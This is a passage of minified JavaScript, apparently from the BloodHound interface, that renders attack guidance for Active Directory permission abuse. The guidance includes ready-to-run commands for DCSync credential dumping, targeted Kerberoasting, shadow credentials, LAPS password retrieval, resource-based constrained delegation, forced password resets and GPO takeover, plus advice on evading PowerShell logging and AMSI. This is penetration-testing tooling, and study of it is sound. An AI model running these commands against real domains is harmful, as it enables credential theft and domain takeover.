'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123"}),e.jsxs(t,{variant:"body2",children:["Source:"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/n00py/DCSync",children:"https://github.com/n00py/DCSync"})]})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organizational Unit"}),e.jsx(t,{variant:"body2",children:"With WriteDACL access on the OU object, you may grant yourself GenericAll against the OU, and then set another ACE on the OU that will inherit down to its descendent objects. First, you will need to set a GenericAll ACE against the OU object itself. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`," ","if you are not running a process as a member of that group. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (group that holds the ACE against the OU):"}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity (OU GUID) -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",a," is: ",i,"."]}),e.jsxs(t,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be"," ",e.jsx(t,{component:"pre",children:"00000000-0000-0000-0000-000000000000"}),":"]}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`})]});default:return null}},Ed=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Passwords "}),e.jsxs(t,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",n," enough privileges to retrieve LAPS passwords domain-wise."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a GPO, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With WriteDacl to an OU object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With WriteDacl to a container object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},Fd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),Ud=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/n00py/DCSync",children:"https://github.com/n00py/DCSync"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]}),_d={general:Md,windowsAbuse:Gd,linuxAbuse:Ed,opsec:Fd,references:Ud},Ld=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the ability to modify the owner of the"," ",I(s)," ",a,"."]}),e.jsx(t,{variant:"body2",children:"Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL."})]}),Wd=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:'Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y'}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
